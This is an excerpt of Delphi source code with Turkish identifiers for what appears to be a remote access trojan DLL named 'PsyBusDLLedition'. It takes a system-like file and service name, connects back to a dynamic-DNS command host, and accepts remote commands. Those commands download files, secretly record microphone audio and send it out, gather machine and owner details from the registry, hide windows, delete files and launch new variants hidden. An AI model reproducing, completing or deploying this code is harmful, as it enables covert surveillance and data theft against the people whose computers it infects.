...
CONST
Tashakli_isim = 'wmipvrce32.dll';
anahtaradi = 'WmiCheckService';
MuteXxX = 'PsyBusDLLedition';
adres = 'psy.hopto.org';
port = 2015;
...
function URLDownloadToFile(Caller: IUnknown; URL: PChar; FileName: PChar; Reserved: DWORD;LPBINDSTATUSCALLBACK: pointer): HResult; stdcall; external 'Urlmon.dll' name 'URLDownloadToFileA';
...
AppHandle:=FindWindow(Nil, sCapt);
   if islem then
      Result:=ShowWindow(apphandle,SW_SHOW)
   else
      Result:=ShowWindow(apphandle,SW_HIDE);
end;
...
Mainsocket.SendString('Baglaniyor: '+sunucu+':'+inttostr(portt)+'/'+usr+'@'+sifre);
...
begin
mainsocket.sendstring('Baglaniyor : '+indirilesi);
UrlDownloadToFile(nil, PChar(indirilesi), PChar(kaydedilesi), 0, nil) ;
if fileexists(kaydedilesi) then mainsocket.sendstring('indirildi :'+kaydedilesi)
else mainsocket.sendstring('Baglanti hatasi :'+indirilesi);
end;
...
sleep(1);
mciSendString(PChar('SAVE mysound ' + sysdizini+'\sysrss128.sys'), nil, 0, alitoputut);
sleep(1);
mciSendString('CLOSE mysound', nil, 0, alitoputut);
mainSocket.Sendstring('Ses Kaydý Tamam ;) / '+inttostr(GetFileSize(sysdizini+'\sysrss128.sys') div 1024)+' kb');
sleep(1);
mainSocket.Sendstring('+al='+sysdizini+'\sysrss128.sys')
end;
...
If (GetOs = 'WinXP') or (GetOs = 'Win2k') or (GetOs = 'WinNT') Then Begin
   a[1]:=Anahtaroku(HKEY_LOCAL_MACHINE, 'Software\Microsoft\Windows NT\CurrentVersion', 'ProductName');
   a[2]:=Anahtaroku(HKEY_LOCAL_MACHINE, 'Software\Microsoft\Windows NT\CurrentVersion', 'RegisteredOwner');
   a[3]:=Anahtaroku(HKEY_LOCAL_MACHINE, 'Software\Microsoft\Windows NT\CurrentVersion', 'RegisteredOrganization');
  End Else Begin
   a[1]:=Anahtaroku(HKEY_LOCAL_MACHINE, 'Software\Microsoft\Windows\CurrentVersion', 'ProductName');
   a[2]:=Anahtaroku(HKEY_LOCAL_MACHINE, 'Software\Microsoft\Windows\CurrentVersion', 'RegisteredOrganization');
   a[3]:=Anahtaroku(HKEY_LOCAL_MACHINE, 'Software\Microsoft\Windows\CurrentVersion', 'RegisteredOwner');
  End;
  if a[1]='' then a[1]:='Bilinmiyor';
  if a[2]='' then a[2]:='Bilinmiyor';
  if a[3]='' then a[3]:='Bilinmiyor';
  if GetPowerStatus = 0 then begin
  if HasBattery then a[4]:='Pil';
  if HasBattery=false then a[4]:='AC Baglanti';
  a[5]:='%'+inttostr(LoadstatusPercent);
  end;
end;
...
begin
  ...
  While Socket.Connected do begin
    ...
    on exception DO HATA('yandýmanam!');
    end;
    ...
    ayrinti1;
    socket.SendString('-bilgi'+'|'+makine+'|'+kullanici+'|'+getos+'|'+GetOSLanguage+'|'+a[1]+'|'+a[2]+'|'+a[3]+'|'+ecozunurluk+'|'+a[4]+'|'+a[5]+'|'+inttostr(GetTickCount)+'|'+inttostr(idle));
    end;
    ...
    deletefile(sysdizini+'\sysrss128.sys');
    ...
    delete(komut, 1, 8);
    if Psakla(pchar(komut),false) = true then socket.SendString('Pencere Gizlendi : '+komut)
    else
    socket.SendString('Pencere Bulunamadi : '+komut);
    end;

    if copy (komut, 1, 7)='/PGSTER' then begin
    delete(komut, 1, 8);
    if Psakla(pchar(komut),true) = true then socket.SendString('Pencere Aktif : '+komut)
    else
    socket.SendString('Pencere Bulunamadi : '+komut);
    end;
    ...
    delete(komut, 1, 7);
    try
    PrintInCoordinate(parcala(komut,0), strtoint(parcala(komut,1)), strtoint(parcala(komut,2)),strtoint(parcala(komut,3)),strtoint(parcala(komut,4)),strtoint(parcala(komut,5)))
    except
    on Exception do hata('Yandýmanam!');
    end;
    Socket.sendstring('Ekrana Yazilan : '+parcala(komut,0));
    end;

    if copy (komut, 1, 6)='/INDIR' then begin
    delete(komut, 1, 7);
    try
    indirilesi:=parcala(komut,0);
    kaydedilesi:=parcala(komut,1);
    except
    on EConvertError DO HATA('yandýmanam!');
    end;
    ...
    if komut = '/YENI' then begin
    Winexec('rundll32.exe wmiprvce32.dll CheckService', SW_HIDE);
    Socket.sendstring('Yeni varyant çalý$týrýldý');
    END;
   //komutlar son!
...
procedure CheckService; stdcall;
begin
